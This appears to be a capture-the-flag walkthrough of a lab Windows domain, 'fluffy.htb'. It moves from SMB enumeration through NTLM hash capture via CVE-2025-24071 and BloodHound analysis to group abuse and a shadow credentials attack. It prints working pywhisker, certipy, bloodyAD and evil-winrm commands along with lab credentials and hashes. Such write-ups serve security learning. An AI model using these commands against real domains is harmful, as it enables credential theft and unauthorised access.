Add user `p.agila` to `Service Memebers` group so i can try to generate shadow creds:

`net rpc group members "Service Accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.129.2.147"`



Generate "shadow credentials" option for `winrm_svc` user

`./bin/python3 pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"`

This saves .pfx file and prints password to stdout



Recovering NT hash for winrm_svc:

`certipy-ad auth -pfx unprotected.pfx -username 'winrm_svc' -domain fluffy.htb -dc-ip 10.129.2.147`

to get shell

`evil-winrm -i 10.129.2.147 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767`

```
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
File 'winrm_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
   
```

# Enumeration

> To start off with we are given the following known credentials: `j.fleischman:J0elTHEM4n1990!`. It seems we can't directly winrm with these creds, so like always we can check them against LDAP and SMB.

![asdf](https://i.imgur.com/bghV28D.png)



> Now that we have a valid SMB/LDAP login, we can start enumerating shares and users.

![asdf](https://i.imgur.com/Jpr9wFC.png)

![asdfasdf](https://i.imgur.com/jHcH7BF.png)



> Seeing the read/write perms for the `IT` share, we should enumerate it and see what's inside. When we do we find some interesting files:

![asdfasdfasdf](https://i.imgur.com/T8YVeA3.png)



> We see two zip files along with their extracted contents along with a file called `Upgrade_Notice.pdf` We open this file in a PDF viewer and see that it's a report detailing vulnerabilities in the system, specifically containing CVE numbers and their associated severity.

![recentvulns](https://i.imgur.com/lWKB1IH.png)



> Looking into the most critical CVEs, one in particular caught my eye. `CVE-2025-24071`

# Foothold

## CVE-2025-24071

> According to [vicarius.io](https://www.vicarius.io/vsociety/posts/cve-2025-24071-spoofing-vulnerability-in-microsoft-windows-file-explorer-detection-scrip): 
>
> "*CVE-2025-24071 is a vulnerability in Microsoft Windows File Explorer that could allow attackers to capture NTLM credentials via crafted network shares, leading to credential theft and broader compromise opportunities.*"
>
> Upon further research I found a [proof of concept](https://github.com/0x6rss/CVE-2025-24071_PoC) that details an implementation of this vulnerability where, if a `.library-ms` file is extracted from a .rar archive, Windows Explorer automatically initiates an SMB authentication request. This can lead to NTLM hash disclosure, and is the exploit we are going to attempt first since we found some .zip files in the share.
>
> 

![make the zip](https://i.imgur.com/AajXCNh.png)

## Domain Enumeration

> After we extract and crack the hash for user `p.agila`, we want to again test these credentials against winrm, SMB, and LDAP to see if we have any new permissions with the new user. Unfortunately it seems we still cannot winrm into the system, and the SMB perms seem to still be the same. Struggling to find any way other way in with the `p.agila`, I thought to try collecting data to feed into bloodhound and see what comes back.



```bash
bloodhound-python --username=p.agila --password=prometheusx-303 --domain=fluffy.htb -ns 10.129.232.88 --collectionmethod=All
```



> The above command collects all domain information on the `fluffy.htb` domain and its structure. Plugging it into bloodhound we can see a path from `p.agila` to the `winrm` account through the following permission chain:

![pathtowinrm](https://i.imgur.com/aNiwB0c.png)



> Since the `winrm_svc` user has permissions to remote into the machine it might get us into the system. We also see that we `p.agila` is a member of the `Service Account Managers` group, which has the `GenericAll` permission on `Service Accounts`, which has `GenericWrite` to the `winrm_svc` account. The bloodhound tips show that we can generate shadow credentials that will allow us to steal the NTLM hash of `winrm_svc` and login with it.



> The following command will add `p.agila` to the `Service Accounts` group, giving us `GenericWrite` over `winrm_svc`. This sets us up for a shadow credentials attack which should result in us receiving the accounts' NTLM hash.

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
```



> Next we use `certipy-ad`'s one shot command to take our `p.agila` credentials and obtain the hash.

```bash
certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```



> This command will first check if the `winrm_svc` user exists and that `p.agila` has the necessary permissions on `winrm_svc` (GenericWrite, GenericAll) to perform the attack. It will then generate a new RSA key pair (private/public key) to create a self-signed certificate formatted for Active Directory. The `winrm_svc` account's `msDS-KeyCredentialLink` attribute will then be modified to contain the public key we generated before. This allows for the bypassing of password authentication by allowing for certificate authentication instead.